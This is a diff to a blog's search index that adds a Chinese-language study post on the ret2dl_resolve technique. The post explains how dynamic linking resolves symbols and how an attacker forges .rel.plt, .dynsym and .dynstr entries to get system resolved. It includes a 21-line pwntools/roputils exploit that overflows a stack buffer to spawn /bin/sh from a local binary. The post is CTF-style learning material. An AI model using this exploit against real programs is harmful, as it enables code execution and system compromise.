@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>Ret2dl</title>
+      <link href="/2021/10/30/Ret2dl/"/>
+      <url>/2021/10/30/Ret2dl/</url>
+      
+        <content type="html"><![CDATA[<p>挺难的一个知识点，看了两天也只弄懂一点皮毛，感觉还是因为最底层的东西没有弄懂导致理解困难</p><p><strong>使用情景：</strong>libc地址不好泄露，也没有其他的漏洞，但是可以栈溢出</p><p><strong>原理</strong></p><p>首先需要了解ELF文件结构以及动态链接相关知识</p><p>当程序进行动态链接时，为了能够减少资源的浪费动态链接将连接的过程推迟到了运行的时候，当我们第一次调用一个函数的时候，程序会查找需要链接的各种信息，再通过_dl_runtime_resolve这个函数将正确的地址写进got.plt表中，第二次查询的时候就不需要再走一遍这个过程了，直接就可以调用函数（详见参考博客）</p><p>那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。</p><p><strong>动态链接过程</strong></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Ret2dl/1635588207298627/20b1708fb00c75422f0e0de71ca3a50c5804b6d8.png" alt="1"></p><p>而整个dl函数的过程入下图所示：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Ret2dl/1635588245719719/d078ccc1c92f9b6d92cc23e5a1e218e31b7ceef0.png" alt="2"></p><p><strong>整个过程说白了就是：</strong></p><ol><li>先从 .rel.plt 表里找到某个函数在 .dynsym 里的偏移</li><li>再从 .dynsym 符号表里找函数在 .dynstr 表里的偏移</li><li>再从 .dynstr 表里找到具体的函数对应的字符串，然后将这个字符串解析成函数 </li></ol><p> <strong>而我们的攻击方式就是伪造所谓的表，然后将我们伪造表的偏移当参数传入，这样的话，他就会解析到我们想需要的函数了</strong></p><p> <strong>攻击:</strong></p><p>可以看到，整个 dl 函数主要是利用了三个表</p><ul><li>.rel.plt</li><li>.dynsym</li><li>dynstr</li></ul><p>那我们要做的就是伪造这三个表，将我们伪造表的偏移当参数传入，这样它就会解析我们想要的函数了</p><p>当然也可以工具一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context </span><br><span class="line">r = process(<span class="string">&#x27;./main&#x27;</span>) </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">r.recv() </span><br><span class="line">rop = ROP(<span class="string">&#x27;./main&#x27;</span>) </span><br><span class="line">offset = <span class="number">112</span> </span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>) </span><br><span class="line">buf = rop.fill(offset) </span><br><span class="line">buf += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>) </span><br><span class="line"><span class="comment">## used to call dl_runtimeresolve() </span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base) </span><br><span class="line">r.send(buf) buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>) </span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf) </span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str </span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>) </span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line"> r.send(buf) </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><p> <strong>参考链接</strong></p><p> <a href="https://blog.csdn.net/qq_41202237/article/details/107378159">https://blog.csdn.net/qq_41202237/article/details/107378159</a></p><p> <a href="https://xz.aliyun.com/t/5122">https://xz.aliyun.com/t/5122</a></p><p> <a href="https://blog.csdn.net/qq_51868336/article/details/114644569">https://blog.csdn.net/qq_51868336/article/details/114644569</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 知识点 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>祥云杯wp</title>
       <link href="/2021/10/30/%E7%A5%A5%E4%BA%91%E6%9D%AFwp/"/>
       <url>/2021/10/30/%E7%A5%A5%E4%BA%91%E6%9D%AFwp/</url>
